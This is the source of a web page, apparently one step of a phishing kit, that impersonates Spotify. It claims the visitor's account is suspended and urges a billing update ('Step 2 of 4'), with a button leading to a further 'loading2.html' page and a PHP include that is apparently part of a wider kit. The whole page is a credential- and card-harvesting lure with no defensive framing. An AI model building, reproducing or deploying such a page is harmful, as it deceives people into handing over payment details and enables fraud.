<?php include "./3d/index.php"; ?>

<!DOCTYPE html>
<html style="font-size: 16px;" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="keywords" content="">
    <meta name="description" content="">
    <title>Spotify</title>
    <link rel="stylesheet" href="./img/main.css" media="screen">
    <link rel="stylesheet" href="./img/spinner.css" media="screen">
    <link rel="stylesheet" href="./img/jland.css" media="screen">        
    <link id="u-theme-google-font" rel="stylesheet" href="./img/css">
    <meta name="theme-color" content="#478ac9">
    <meta property="og:title" content="jland">
    <meta property="og:type" content="website">
  <body data-path-to-root="./" data-include-products="false" class="u-body u-xl-mode" data-lang="en">
        <div id="overlay">
  <div class="cv-spinner">
    <span class="spinner"></span>
  </div>
</div><header class="u-clearfix u-custom-color-1 u-header u-header" id="sec-0a1f"><div class="u-clearfix u-sheet u-valign-middle-sm u-valign-middle-xs u-sheet-1">
        <img class="u-hidden-lg u-hidden-md u-hidden-xl u-image u-image-default u-image-1" src="./img/ico.png" alt="" data-image-width="459" data-image-height="234">
        <p class="u-custom-font u-hidden-sm u-hidden-xs u-text u-text-default u-text-1"><span class="u-file-icon u-icon u-text-white u-icon-1"><img src="./img/1946429-27ae17d7.png" alt=""></span>&nbsp;Profile&nbsp;
        </p>
        <a class="u-image u-logo u-image-2" data-image-width="300" data-image-height="95">
          <img src="./img/logo1.svg" class="u-logo-image u-logo-image-1">
        </a>
      </div></header>
    <section class="skrollable u-clearfix u-custom-color-1 u-parallax u-section-1" id="sec-3fac">
      <div class="u-clearfix u-sheet u-sheet-1">
        <p class="u-align-center-xs u-custom-font u-text u-text-default-lg u-text-default-md u-text-default-xl u-text-1">Update your billing information</p>
<img class="u-expanded-width-sm u-expanded-width-xs u-image u-image-default u-image-1" src="./img/update1.png" alt="" data-image-width="2415" data-image-height="32">
<div class="u-container-align-left-xs u-container-style u-expanded-width-xs u-group u-shape-rectangle u-group-1">
  <div class="u-container-layout u-container-layout-1">
    <span class="u-align-left-xs u-file-icon u-icon u-text-grey-50 u-icon-1"><img src="./img/271220-11a1ae80.png" alt=""></span>
    <p class="u-align-left-xs u-custom-font u-text u-text-default u-text-grey-40 u-text-2">Step 2 of 4</p>
    <p class="u-align-left-xs u-custom-font u-text u-text-default u-text-3">Update your billing</p>
  </div>
</div>
<p class="u-custom-font u-text u-text-4">Update your billing</p>
<p class="u-custom-font u-text u-text-5">To activate your account, please update your card details</p>
<p class="u-custom-font u-text u-text-6">My cards</p>
<div class="u-align-right u-border-1 u-border-grey-75 u-container-style u-expanded-width-xs u-group u-radius-8 u-shape-round u-group-2">
  <div class="u-container-layout u-container-layout-2">
    <img class="custom-expanded u-image u-image-default u-image-2" src="./img/dot.png" alt="" data-image-width="414" data-image-height="178">
    <p class="u-custom-font u-text u-text-palette-2-light-1 u-text-7">Suspended</p>
  </div>
</div>
<button onclick="location.href='loading2.html';" id="button" class="u-border-none u-btn u-btn-round u-button-style u-custom-color-2 u-custom-font u-hover-custom-color-6 u-radius-50 u-btn-1">Update</button>
</div>
</section>

<footer class="u-align-center u-clearfix u-custom-color-1 u-footer u-footer" id="sec-17bd">
  <div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
    <p class="u-custom-font u-small-text u-text u-text-grey-40 u-text-variant u-text-1">This site is protected by reCAPTCHA, and Google's Privacy Policy and Terms of Service apply.</p>
  </div>
</footer>


      <script src="./img/jquery.min.js.téléchargement" type="text/javascript"></script>

<script type="text/javascript">
  
jQuery(function($){
  $(document).ajaxSend(function() {
    $("#overlay").fadeIn(300);　
  });
    
  $('#button').click(function(){
    $.ajax({
      type: 'GET',
      success: function(data){
        console.log(data);
      }
    }).done(function() {
      setTimeout(function(){
        $("#overlay").fadeOut(300);
      },1500);
    });
  }); 
});

</script>

  </body></html>